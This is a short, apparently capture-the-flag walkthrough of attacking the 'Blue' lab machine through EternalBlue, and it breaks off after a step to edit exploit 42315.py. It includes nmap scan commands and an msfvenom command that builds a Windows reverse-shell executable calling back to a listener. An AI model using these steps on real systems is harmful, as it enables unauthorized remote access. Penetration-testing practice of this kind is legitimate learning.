Blue without Metasploit:

![Blue](https://user-images.githubusercontent.com/55708909/91400272-fe577080-e85c-11ea-83eb-62df0e7decde.png)

tarting with Nmap Scan :
Nmap -sC -sV -T4 -A -O -oA Legacy -p- 10.10.10.40

![Blue_nmap](https://user-images.githubusercontent.com/55708909/91406950-14b2fb80-e860-11ea-963e-24b543e3b6b1.png)

Since basic tools doesn't work therefore again i run nmap vulnerability scan its a kind of methodolgy which is helpful for me.

![Blue_vuln](https://user-images.githubusercontent.com/55708909/91407940-a91d5e00-e860-11ea-9af1-7b89d7ce97fb.png)


Nmap found only one vulnerability that is eternal blue so we are going to exploit it.

![Blue_exploit](https://user-images.githubusercontent.com/55708909/91408457-8b042d80-e861-11ea-90ee-cb9a68007cd4.png)

First create a payload using msfvenom 

msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe > shell.exe

edit 42315.py files

![42315_PART_1](https://user-images.githubusercontent.com/55708909/91409346-eaaf0880-e862-11ea-8b35-88a345bb3cf7.png)









